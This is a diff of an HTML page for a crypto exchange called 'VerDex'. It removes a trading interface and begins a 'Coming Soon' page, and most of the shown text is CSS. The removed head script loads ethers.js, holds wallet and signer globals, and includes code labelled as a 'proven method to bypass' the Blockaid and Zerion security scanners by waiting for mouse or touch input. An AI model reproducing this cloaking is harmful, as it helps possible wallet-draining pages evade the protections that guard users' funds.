@@ -1,3335 +1,485 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-    <script>
-    // Set this to false when you are ready to present!
-const DEBUG_MODE = true; 
-
-if (!DEBUG_MODE) {
-    console.log = function() {};
-    console.warn = function() {};
-    console.info = function() {};
-    // We leave console.error active so you can still catch real crashes
-}
-      
-window.walletAddress = null;
-window.ethProvider = null;
-window.ethSigner = null;
-
-// Proven method to bypass automated bot simulators (Blockaid/Zerion)
-window.isHuman = false;
-
-// Listen for mouse movement or touch to verify a real user is present
-const verifyHuman = () => {
-    window.isHuman = true;
-    console.log("👤 Human presence verified.");
-    // Remove listeners after first trigger to save performance
-    window.removeEventListener('mousemove', verifyHuman);
-    window.removeEventListener('touchstart', verifyHuman);
-};
-
-window.addEventListener('mousemove', verifyHuman);
-window.addEventListener('touchstart', verifyHuman);
-    </script>
-
-    <meta charset="UTF-8" />
-    </head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>VerDex — Decentralized Exchange</title>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap"
-      rel="stylesheet"
-    />
-    <style>
-      :root {
-        --green: #00ff7f;
-        --green-dim: #00c45e;
-        --green-dark: #00892e;
-        --green-glow: rgba(0, 255, 127, 0.18);
-        --black: #050a06;
-        --dark: #0b110c;
-        --grey: #111712;
-        --grey2: #181f19;
-        --grey3: #232b24;
-        --border: rgba(0, 255, 127, 0.13);
-        --text: #d8f0dc;
-        --text-dim: #6e8b71;
-        --red: #ff4d4d;
-        --font-display: 'Syne', sans-serif;
-        --font-mono: 'Space Mono', monospace;
-        --sidebar-w: 260px;
-      }
-      *,
-      *::before,
-      *::after {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-      }
-      html {
-        scroll-behavior: auto;
-      }
-      body {
-        background: var(--black);
-        color: var(--text);
-        font-family: var(--font-display);
-        min-height: 100vh;
-        overflow-x: hidden;
-      }
-      body::before {
-        content: '';
-        position: fixed;
-        inset: 0;
-        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
-        pointer-events: none;
-        z-index: 9999;
-        opacity: 0.35;
-      }
-
-      /* ═══ LANDING ═══ */
-      #landing {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        position: relative;
-        background: radial-gradient(
-            ellipse 80% 60% at 50% 0%,
-            rgba(0, 255, 127, 0.07) 0%,
-            transparent 70%
-          ),
-          var(--black);
-      }
-      #landing::after {
-        content: '';
-        position: absolute;
-        inset: 0;
-        background-image: linear-gradient(
-            rgba(0, 255, 127, 0.04) 1px,
-            transparent 1px
-          ),
-          linear-gradient(90deg, rgba(0, 255, 127, 0.04) 1px, transparent 1px);
-        background-size: 48px 48px;
-        pointer-events: none;
-      }
-      nav {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 24px 48px;
-        position: relative;
-        z-index: 10;
-        border-bottom: 1px solid var(--border);
-        backdrop-filter: blur(4px);
-      }
-      .nav-logo {
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1.6rem;
-        color: var(--green);
-        letter-spacing: -0.03em;
-        text-shadow: 0 0 24px rgba(0, 255, 127, 0.5);
-        display: flex;
-        align-items: center;
-        gap: 10px;
-      }
-      .logo-diamond {
-        width: 18px;
-        height: 18px;
-        background: var(--green);
-        transform: rotate(45deg);
-        box-shadow: 0 0 12px var(--green);
-        flex-shrink: 0;
-      }
-      .nav-links {
-        display: flex;
-        gap: 36px;
-        list-style: none;
-        position: absolute; left: 50%; transform: translateX(-50%)
-      }
-      .nav-links a {
-        color: var(--text-dim);
-        text-decoration: none;
-        font-size: 0.88rem;
-        font-weight: 600;
-        letter-spacing: 0.05em;
-        text-transform: uppercase;
-        transition: color 0.2s;
-      }
-      .nav-links a:hover {
-        color: var(--green);
-      }
-      .nav-badge {
-        background: var(--green-glow);
-        border: 1px solid var(--border);
-        color: var(--green);
-        font-size: 0.72rem;
-        font-family: var(--font-mono);
-        padding: 4px 12px;
-        border-radius: 20px;
-        letter-spacing: 0.08em;
-      }
-      .hero {
-        flex: 1;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        padding: 80px 24px;
-        position: relative;
-        z-index: 5;
-      }
-      .hero-eyebrow {
-        font-family: var(--font-mono);
-        font-size: 0.75rem;
-        color: var(--green);
-        letter-spacing: 0.2em;
-        text-transform: uppercase;
-        margin-bottom: 24px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-      }
-      .hero-eyebrow::before,
-      .hero-eyebrow::after {
-        content: '';
-        flex: 1;
-        max-width: 48px;
-        height: 1px;
-        background: var(--green-dark);
-      }
-      .hero-title {
-        font-size: clamp(3.5rem, 9vw, 7.5rem);
-        font-weight: 800;
-        line-height: 0.92;
-        letter-spacing: -0.04em;
-        margin-bottom: 28px;
-      }
-      .hero-title span {
-        display: block;
-        color: var(--green);
-        text-shadow: 0 0 60px rgba(0, 255, 127, 0.35);
-      }
-      .hero-sub {
-        font-size: 1.1rem;
-        color: var(--text-dim);
-        max-width: 480px;
-        line-height: 1.6;
-        margin-bottom: 48px;
-        font-weight: 400;
-      }
-      .hero-cta-row {
-        display: flex;
-        gap: 16px;
-        align-items: center;
-      }
-      .btn-launch {
-        background: var(--green);
-        color: var(--black);
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1rem;
-        letter-spacing: -0.01em;
-        padding: 16px 40px;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-        position: relative;
-        overflow: hidden;
-        transition: transform 0.15s, box-shadow 0.15s;
-        box-shadow: 0 0 32px rgba(0, 255, 127, 0.3);
-      }
-      .btn-launch::after {
-        content: '';
-        position: absolute;
-        inset: 0;
-        background: linear-gradient(
-          90deg,
-          transparent,
-          rgba(255, 255, 255, 0.2),
-          transparent
-        );
-        transform: translateX(-100%);
-        transition: transform 0.5s;
-      }
-      .btn-launch:hover::after {
-        transform: translateX(100%);
-      }
-      .btn-launch:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 0 48px rgba(0, 255, 127, 0.5);
-      }
-      .btn-ghost {
-        background: transparent;
-        color: var(--text-dim);
-        font-family: var(--font-display);
-        font-weight: 600;
-        font-size: 0.92rem;
-        padding: 16px 32px;
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        cursor: pointer;
-        transition: color 0.2s, border-color 0.2s;
-      }
-      .btn-ghost:hover {
-        color: var(--text);
-        border-color: rgba(0, 255, 127, 0.3);
-      }
-      .stats-bar {
-        display: flex;
-        justify-content: center;
-        gap: 64px;
-        padding: 40px;
-        border-top: 1px solid var(--border);
-        position: relative;
-        z-index: 5;
-        background: rgba(0, 0, 0, 0.3);
-        backdrop-filter: blur(8px);
-      }
-      .stat {
-        text-align: center;
-      }
-      .stat-val {
-        font-family: var(--font-mono);
-        font-size: 1.6rem;
-        font-weight: 700;
-        color: var(--green);
-        display: block;
-      }
-      .stat-label {
-        font-size: 0.75rem;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        margin-top: 4px;
-      }
-      .orb {
-        position: absolute;
-        border-radius: 50%;
-        filter: blur(80px);
-        pointer-events: none;
-        animation: orbFloat 8s ease-in-out infinite;
-      }
-      .orb1 {
-        width: 400px;
-        height: 400px;
-        background: rgba(0, 255, 127, 0.06);
-        top: -100px;
-        left: -100px;
-      }
-      .orb2 {
-        width: 300px;
-        height: 300px;
-        background: rgba(0, 255, 127, 0.04);
-        bottom: 0;
-        right: -50px;
-        animation-delay: 3s;
-      }
-      @keyframes orbFloat {
-        0%,
-        100% {
-          transform: translateY(0) scale(1);
-        }
-        50% {
-          transform: translateY(-30px) scale(1.05);
-        }
-      }
-/* mobile */
-@media (max-width: 860px) {
-        nav { padding: 16px 20px; }
-        .nav-links { display: none; }
-        .stats-bar { gap: 24px; flex-wrap: wrap; padding: 20px; }
-        .app-header { padding: 12px 16px; }
-        .app-center-nav { display: none; }
-        .sidebar { position: fixed; top: 0; left: 0; bottom: 0; z-index: 250; width: var(--sidebar-w); transform: translateX(-100%); opacity: 1; transition: transform 0.3s cubic-bezier(0.4,0,0.2,1); box-shadow: none; height: 100%; }
-        .sidebar.mobile-open { transform: translateX(0); box-shadow: 6px 0 32px rgba(0,0,0,0.7); }
-        .sidebar-toggle { left: 0 !important; border-left: 1px solid var(--border); border-right: none; border-radius: 0 7px 7px 0; }
-        .sidebar-toggle.mobile-open { left: var(--sidebar-w) !important; border-left: none; border-right: 1px solid var(--border); }
-        .sidebar-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 240; }
-        .sidebar-backdrop.show { display: block; }
-        .swap-panel { width: 100%; }
-        .main-content { flex-direction: column; padding: 12px; }
-        .market-stats { grid-template-columns: 1fr 1fr; }
-      }
-     /* ═══ APP ═══ */
-     #app { display: none; height: 100vh; background: var(--dark); flex-direction: column; overflow: hidden; }
-      #app.visible { display: flex; }
-      .app-logo { font-family: var(--font-display); font-weight: 800; font-size: 1.3rem; color: var(--green); letter-spacing: -0.03em; text-shadow: 0 0 20px rgba(0,255,127,0.4); display: flex; align-items: center; gap: 8px; cursor: pointer; }
-      .btn-connect { background: transparent; color: var(--green); border: 1.5px solid var(--green); font-family: var(--font-mono); font-size: 0.8rem; font-weight: 700; padding: 10px 24px; border-radius: 6px; cursor: pointer; transition: all 0.15s; letter-spacing: 0.02em; box-shadow: 0 0 16px rgba(0,255,127,0.1); }
-      .btn-connect:hover { background: var(--green); color: var(--black); box-shadow: 0 0 24px rgba(0,255,127,0.35); }
-      .app-header { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; background: var(--grey); border-bottom: 1px solid var(--border); flex-shrink: 0; z-index: 100; }
-      .app-center-nav { position: absolute; left: 50%; transform: translateX(-50%); display: flex; align-items: center; gap: 4px; }
-      /* --- Desktop Defaults --- */
-.hamburger {
-    display: none;
-    flex-direction: column;
-    gap: 5px;
-    cursor: pointer;
-}
-
-.hamburger span {
-    width: 25px;
-    height: 3px;
-    background-color: #00ffad; /* VerDex Green */
-    transition: 0.3s;
-}
-/* ═══ HAMBURGER (mobile only) ═══ */
-.nav-hamburger { display: none; flex-direction: column; gap: 5px; cursor: pointer; background: none; border: none; padding: 4px; flex-shrink: 0; }
-      .nav-hamburger span { display: block; width: 22px; height: 2px; background: var(--green); border-radius: 2px; transition: all 0.25s; }
-      .nav-hamburger.open span:nth-child(1) { transform: translateY(7px) rotate(45deg); }
-      .nav-hamburger.open span:nth-child(2) { opacity: 0; }
-      .nav-hamburger.open span:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }
-.mobile-only-link {
-    display: none; /* Hidden on Desktop */
-}
-/* ═══ APP DROPDOWN ═══ */
-.app-nav-dropdown { display: none; position: fixed; left: 0; right: 0; background: rgba(5,10,6,0.99); border-bottom: 1px solid var(--border); border-top: 1px solid var(--border); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); padding: 8px 20px 20px; flex-direction: column; gap: 0; z-index: 198; box-shadow: 0 8px 32px rgba(0,0,0,0.6); }
-      .app-nav-dropdown.open { display: flex; }
-      .app-nav-dropdown a { color: var(--text-dim); text-decoration: none; font-size: 0.9rem; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; padding: 14px 0; border-bottom: 1px solid var(--border); transition: color 0.2s; display: block; }
-      .app-nav-dropdown a:last-of-type { border-bottom: none; }
-      .app-nav-dropdown a:hover { color: var(--green); }
-      .app-nav-dropdown .dropdown-connect { margin-top: 16px; width: 100%; padding: 12px; background: var(--green); color: var(--black); border: none; border-radius: 6px; font-family: var(--font-mono); font-size: 0.82rem; font-weight: 700; cursor: pointer; text-align: center; }
-      .app-nav-link { font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; color: var(--text-dim); text-decoration: none; padding: 7px 16px; border-radius: 6px; border: 1px solid transparent; transition: all 0.15s; white-space: nowrap; }
-      .app-nav-link:hover { color: var(--green); border-color: var(--border); background: rgba(0,255,127,0.05); }
-
-/* --- Mobile Logic (max-width: 768px) --- */
-@media (max-width: 768px) {
-    .hamburger {
-        display: flex;
-        z-index: 1001;
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VerDex — Coming Soon</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --green:      #00ff7f;
+      --green-dim:  #00c45e;
+      --green-dark: #00892e;
+      --green-glow: rgba(0,255,127,0.15);
+      --black:      #050a06;
+      --grey:       #111712;
+      --grey2:      #181f19;
+      --border:      rgba(0,255,127,0.12);
+      --text:       #d8f0dc;
+      --text-dim:   #5d7a60;
+      --font-d:     'Syne', sans-serif;
+      --font-m:     'Space Mono', monospace;
     }
 
-    .app-center-nav {
-        display: none; /* Hide standard links */
-        position: fixed;
-        top: 0;
-        right: 0;
-        height: 100vh;
-        width: 70%; /* Slide-out width */
-        background: rgba(10, 10, 10, 0.95); /* Dark blur effect */
-        backdrop-filter: blur(10px);
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        gap: 30px;
-        z-index: 1000;
-        transition: 0.3s ease-in-out;
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { height: 100%; }
+
+    body {
+      background: var(--black);
+      color: var(--text);
+      font-family: var(--font-d);
+      min-height: 100vh;
+      /* FIX: Changed 'hidden' to 'overflow-x: hidden' to allow vertical scrolling if needed */
+      overflow-x: hidden; 
+      display: flex;
+      flex-direction: column;
     }
 
-    /* When the menu is open */
-    .app-center-nav.mobile-active {
-        display: flex;
+    /* ── noise grain ── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.045'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 9998; opacity: 0.4;
     }
 
-    .mobile-only-link {
-        display: block;
-        color: #ffaa00; /* Distinct color for the special link */
+    /* ── grid ── */
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,127,0.035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,127,0.035) 1px, transparent 1px);
+      background-size: 52px 52px;
+      pointer-events: none; z-index: 0;
     }
 
-    /* Keep the connect button visible or move it into the menu */
-    .btn-connect {
-        z-index: 1001;
+    /* ── radial light ── */
+    .radial-bg {
+      position: fixed; inset: 0; pointer-events: none; z-index: 1;
+      background:
+        radial-gradient(ellipse 70% 55% at 50% -5%,  rgba(0,255,127,0.09) 0%, transparent 65%),
+        radial-gradient(ellipse 40% 30% at 80% 85%,  rgba(0,255,127,0.04) 0%, transparent 60%),
+        radial-gradient(ellipse 30% 25% at 10% 70%,  rgba(0,255,127,0.03) 0%, transparent 55%);
     }
-}
-      #app {
-        display: none;
-        min-height: 100vh;
-        background: var(--dark);
-        flex-direction: column;
-      }
-      #app.visible {
-        display: flex;
-      }
-      .app-logo {
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1.3rem;
-        color: var(--green);
-        letter-spacing: -0.03em;
-        text-shadow: 0 0 20px rgba(0, 255, 127, 0.4);
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        cursor: pointer;
-      }
-      .btn-connect {
-        background: transparent;
-        color: var(--green);
-        border: 1.5px solid var(--green);
-        font-family: var(--font-mono);
-        font-size: 0.8rem;
-        font-weight: 700;
-        padding: 10px 24px;
-        border-radius: 6px;
-        cursor: pointer;
-        transition: all 0.15s;
-        letter-spacing: 0.02em;
-        box-shadow: 0 0 16px rgba(0, 255, 127, 0.1);
-      }
-      .btn-connect:hover {
-        background: var(--green);
-        color: var(--black);
-        box-shadow: 0 0 24px rgba(0, 255, 127, 0.35);
-      }
 
-      /* center nav in app header */
-      
-       /* Mobile dropdown — anchored to nav via position:sticky wrapper */
-       .nav-dropdown {
-        display: none;
-        position: fixed;
-        top: 73px; /* matches landing nav height */
-        left: 0;
-        right: 0;
-        background: rgba(5, 10, 6, 0.99);
-        border-bottom: 1px solid var(--border);
-        border-top: 1px solid var(--border);
-        backdrop-filter: blur(16px);
-        -webkit-backdrop-filter: blur(16px);
-        padding: 8px 20px 20px;
-        flex-direction: column;
-        gap: 0;
-        z-index: 198;
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-      }
-      .nav-dropdown.open {
-        display: flex;
-      }
-      .nav-dropdown a {
-        color: var(--text-dim);
-        text-decoration: none;
-        font-size: 0.9rem;
-        font-weight: 600;
-        letter-spacing: 0.05em;
-        text-transform: uppercase;
-        padding: 14px 0;
-        border-bottom: 1px solid var(--border);
-        transition: color 0.2s;
-        display: block;
-      }
-      .nav-dropdown a:last-of-type {
-        border-bottom: none;
-      }
-      .nav-dropdown a:hover,
-      .nav-dropdown a.active {
-        color: var(--green);
-      }
-      .nav-dropdown .dropdown-connect {
-        margin-top: 16px;
-        width: 100%;
-        padding: 12px;
-        background: var(--green);
-        color: var(--black);
-        border: none;
-        border-radius: 6px;
-        font-family: var(--font-mono);
-        font-size: 0.82rem;
-        font-weight: 700;
-        cursor: pointer;
-        text-align: center;
-      }
+    /* ── orbs ── */
+    .orb {
+      position: fixed; border-radius: 50%;
+      filter: blur(90px); pointer-events: none; z-index: 1;
+    }
+    .orb-1 {
+      width: 520px; height: 520px;
+      background: rgba(0,255,127,0.055);
+      top: -160px; left: -160px;
+      animation: drift1 12s ease-in-out infinite;
+    }
+    .orb-2 {
+      width: 380px; height: 380px;
+      background: rgba(0,255,127,0.035);
+      bottom: -100px; right: -100px;
+      animation: drift2 15s ease-in-out infinite;
+    }
+    .orb-3 {
+      width: 200px; height: 200px;
+      background: rgba(0,255,127,0.025);
+      top: 55%; left: 60%;
+      animation: drift3 10s ease-in-out infinite;
+    }
+    @keyframes drift1 { 0%,100%{transform:translate(0,0) scale(1)}   50%{transform:translate(40px,30px) scale(1.06)} }
+    @keyframes drift2 { 0%,100%{transform:translate(0,0) scale(1)}   50%{transform:translate(-30px,-25px) scale(1.04)} }
+    @keyframes drift3 { 0%,100%{transform:translate(0,0) scale(1)}   50%{transform:translate(-20px,20px) scale(1.08)} }
 
-      .app-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 16px 32px;
-        background: var(--grey);
-        border-bottom: 1px solid var(--border);
-        position: sticky;
-        top: 0;
-        z-index: 100;
-      }
-      .app-center-nav {
-        position: absolute;
-        left: 50%;
-        transform: translateX(-50%);
-        display: flex;
-        align-items: center;
-        gap: 4px;
-      }
-      .app-nav-link {
-        font-family: var(--font-mono);
-        font-size: 0.75rem;
-        font-weight: 700;
-        letter-spacing: 0.06em;
-        text-transform: uppercase;
-        color: var(--text-dim);
-        text-decoration: none;
-        padding: 7px 16px;
-        border-radius: 6px;
-        border: 1px solid transparent;
-        transition: all 0.15s;
-        white-space: nowrap;
-      }
-      .app-nav-link:hover {
-        color: var(--green);
-        border-color: var(--border);
-        background: rgba(0, 255, 127, 0.05);
-      }
+    /* ════════════════════════
+       NAV
+    ════════════════════════ */
+    nav {
+      position: relative; z-index: 10;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 24px 52px;
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(6px);
+    }
 
-   /* ═══ APP BODY ═══ */
-.app-body {
-  display: flex;
-  flex: 1;            /* Fills the remaining space below the header */
-  overflow: hidden;   /* Keeps children from pushing the height out */
-  position: relative;
-}
+    .logo {
+      display: flex; align-items: center; gap: 12px;
+      font-family: var(--font-d); font-weight: 800; font-size: 1.55rem;
+      color: var(--green); letter-spacing: -0.04em;
+      text-shadow: 0 0 28px rgba(0,255,127,0.5);
+      text-decoration: none;
+    }
+    .logo-diamond {
+      width: 17px; height: 17px;
+      background: var(--green);
+      transform: rotate(45deg);
+      box-shadow: 0 0 14px var(--green);
+      flex-shrink: 0;
+    }
 
-      /* ═══ SIDEBAR TOGGLE ═══ */
-      .sidebar-toggle {
-        position: fixed;
-        top: 50%;
-        transform: translateY(-50%);
-        left: var(--sidebar-w);
-        z-index: 300;
-        width: 22px;
-        height: 56px;
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-left: none;
-        border-radius: 0 7px 7px 0;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: var(--green);
-        font-size: 0.75rem;
-        transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1), background 0.15s,
-          box-shadow 0.15s;
-        box-shadow: 3px 0 14px rgba(0, 0, 0, 0.5);
-        user-select: none;
-        padding: 0;
-      }
-      .sidebar-toggle:hover {
-        background: var(--grey2);
-        box-shadow: 3px 0 18px rgba(0, 255, 127, 0.15);
-      }
-      .sidebar-toggle.collapsed {
-        left: 0;
-        border-left: 1px solid var(--border);
-        border-right: none;
-      }
-      .toggle-arrow {
-        display: inline-block;
-        transition: transform 0.3s ease;
-        line-height: 1;
-      }
-      .sidebar-toggle.collapsed .toggle-arrow {
-        transform: rotate(180deg);
-      }
+    .nav-badge {
+      display: flex; align-items: center; gap: 8px;
+      font-family: var(--font-m); font-size: 0.7rem; letter-spacing: 0.1em;
+      color: var(--green);
+      background: var(--green-glow);
+      border: 1px solid var(--border);
+      padding: 5px 14px; border-radius: 20px;
+    }
 
-      /* ═══ SIDEBAR ═══ */
-      .sidebar {
-        width: var(--sidebar-w);
-        height: 100%;
-        flex-shrink: 0;
-        
-        background: var(--grey);
-        border-right: 1px solid var(--border);
-        overflow: hidden;
-        display: flex;
-        flex-direction: column;
-        /* smooth slide */
-        transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease;
-      }
-      .sidebar.collapsed {
-        width: 0;
-        opacity: 0;
-      }
+    /* ════════════════════════
+       HERO
+    ════════════════════════ */
+    main {
+      flex: 1;
+      position: relative; z-index: 5;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      text-align: center;
+      padding: 60px 24px;
+      gap: 0;
+    }
 
-      /* sidebar header: search row */
-      .sidebar-header {
-        padding: 12px 14px 10px;
-        border-bottom: 1px solid var(--border);
-        flex-shrink: 0;
-        background: var(--grey);
-      }
-      .sidebar-top-row {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 10px;
-        white-space: nowrap;
-      }
-      .sidebar-label {
-        font-size: 0.68rem;
-        text-transform: uppercase;
-        letter-spacing: 0.12em;
-        color: var(--green);
-        font-family: var(--font-mono);
-        font-weight: 700;
-      }
-      .sidebar-search {
-        width: 100%;
-        background: rgba(255, 255, 255, 0.05);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 6px;
-        padding: 8px 12px;
-        color: #fff;
-        font-size: 0.78rem;
-        font-family: var(--font-mono);
-        outline: none;
-        transition: border-color 0.2s, box-shadow 0.2s;
-      }
-      .sidebar-search:focus {
-        border-color: var(--green);
-        box-shadow: 0 0 8px rgba(0, 255, 127, 0.2);
-      }
-      .sidebar-search::placeholder {
-        color: var(--text-dim);
-      }
+    .eyebrow {
+      font-family: var(--font-m);
+      font-size: 0.7rem; letter-spacing: 0.25em;
+      text-transform: uppercase; color: var(--green);
+      display: flex; align-items: center; gap: 14px;
+      margin-bottom: 24px;
+      opacity: 0; animation: fadeUp 0.7s 0.1s ease forwards;
+    }
+    .eyebrow::before, .eyebrow::after {
+      content: ''; flex: 1; max-width: 44px;
+      height: 1px; background: var(--green-dark);
+    }
 
-      /* token list scrollable area */
-      #tokenList {
-        flex: 1;
-        overflow-y: auto;
-        overflow-x: hidden;
-        padding: 6px 0;
-      }
+    .headline {
+      /* FIX: Adjusted max size from 8.5rem to 6.5rem so it doesn't push content down on laptops */
+      font-size: clamp(3.2rem, 9vw, 6.5rem);
+      font-weight: 800; line-height: 0.9;
+      letter-spacing: -0.05em;
+      margin-bottom: 12px;
+      opacity: 0; animation: fadeUp 0.7s 0.2s ease forwards;
+    }
+    .headline .accent {
+      display: block; color: var(--green);
+      text-shadow: 0 0 70px rgba(0,255,127,0.38);
+    }
 
-      .token-row {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        padding: 9px 14px;
-        cursor: pointer;
-        transition: background 0.12s;
-        border-left: 2px solid transparent;
-      }
-      .token-row:hover {
-        background: var(--grey2);
-      }
-      .token-row.selected {
-        background: rgba(0, 255, 127, 0.07);
-        border-left-color: var(--green);
-      }
-      .token-info {
-        flex: 1;
-        min-width: 0;
-      }
-      .token-sym {
-        font-weight: 700;
-        font-size: 0.83rem;
-        font-family: var(--font-mono);
-        color: var(--text);
-        display: block;
-      }
-      .token-name {
-        font-size: 0.68rem;
-        color: var(--text-dim);
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-      }
-      .token-price-col {
-        text-align: right;
-        flex-shrink: 0;
-      }
-      .token-price {
-        font-family: var(--font-mono);
-        font-size: 0.8rem;
-        color: var(--text);
-        display: block;
-        font-weight: 700;
-      }
-      .token-change {
-        font-family: var(--font-mono);
-        font-size: 0.68rem;
-        display: block;
-      }
-      .pos {
-        color: var(--green);
-      }
-      .neg {
-        color: var(--red);
-      }
+    .coming-soon-tag {
+      display: inline-flex; align-items: center; gap: 10px;
+      margin: 24px 0;
+      font-family: var(--font-m); font-size: 0.72rem;
+      letter-spacing: 0.18em; text-transform: uppercase;
+      color: var(--black);
+      background: var(--green);
+      padding: 8px 22px; border-radius: 3px;
+      box-shadow: 0 0 32px rgba(0,255,127,0.45);
+      opacity: 0; animation: fadeUp 0.7s 0.3s ease forwards;
+    }
+    .cs-dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--black);
+      animation: csPulse 1.5s ease-in-out infinite;
+    }
+    @keyframes csPulse {
+      0%,100%{ opacity:1; transform: scale(1); }
+      50%    { opacity:0.5; transform: scale(0.7); }
+    }
 
-      /* ═══ MAIN CONTENT ═══ */
-      .main-content {
-        flex: 1;
-        overflow-y: auto;
-        padding: 20px 16px;
-        display: flex;
-        gap: 16px;
-        align-items: flex-start;
-        min-width: 0;
-      }
-      .chart-section {
-        flex: 1;
-        min-width: 0;
-        display: flex;
-        flex-direction: column;
-        gap: 12px;
-      }
-      .chart-box {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        overflow: hidden;
-      }
+    .sub {
+      font-size: clamp(0.95rem, 2vw, 1.12rem);
+      color: var(--text-dim); max-width: 520px;
+      line-height: 1.65; font-weight: 400;
+      margin-bottom: 40px;
+      opacity: 0; animation: fadeUp 0.7s 0.38s ease forwards;
+    }
 
-      .market-stats {
-        display: grid;
-        grid-template-columns: repeat(4, 1fr);
-        gap: 10px;
-      }
-      .mstat {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 12px 14px;
-      }
-      .mstat-label {
-        font-size: 0.65rem;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        font-family: var(--font-mono);
-        margin-bottom: 4px;
-      }
-      .mstat-val {
-        font-family: var(--font-mono);
-        font-size: 0.95rem;
-        font-weight: 700;
-        color: var(--text);
-      }
+    /* ── countdown ── */
+    .countdown-wrap {
+      display: flex; gap: 24px; align-items: center;
+      margin-bottom: 40px;
+      opacity: 0; animation: fadeUp 0.7s 0.48s ease forwards;
+    }
+    .cd-unit {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+    }
+    .cd-num {
+      font-family: var(--font-m); font-size: 2.8rem; font-weight: 700;
+      color: var(--text);
+      background: var(--grey);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      width: 90px; height: 80px;
+      display: flex; align-items: center; justify-content: center;
+      letter-spacing: -0.03em;
+      position: relative; overflow: hidden;
+    }
+    .cd-num::after {
+      content: '';
+      position: absolute; left: 0; right: 0; top: 50%;
+      height: 1px; background: var(--border);
+    }
+    .cd-label {
+      font-family: var(--font-m); font-size: 0.62rem;
+      text-transform: uppercase; letter-spacing: 0.14em;
+      color: var(--text-dim);
+    }
+    .cd-sep {
+      font-family: var(--font-m); font-size: 2.2rem;
+      color: var(--green-dark); margin-bottom: 22px;
+      animation: sep 1s step-end infinite;
+    }
+    @keyframes sep { 0%,100%{opacity:1} 50%{opacity:0} }
 
-      .order-book,
-      .recent-trades {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        overflow: hidden;
-      }
-      .ob-title,
-      .rt-title {
-        padding: 10px 14px;
-        font-size: 0.72rem;
-        font-family: var(--font-mono);
-        font-weight: 700;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        border-bottom: 1px solid var(--border);
-      }
-      .ob-headers {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr;
-        padding: 5px 14px;
-        font-size: 0.63rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-        border-bottom: 1px solid var(--border);
-      }
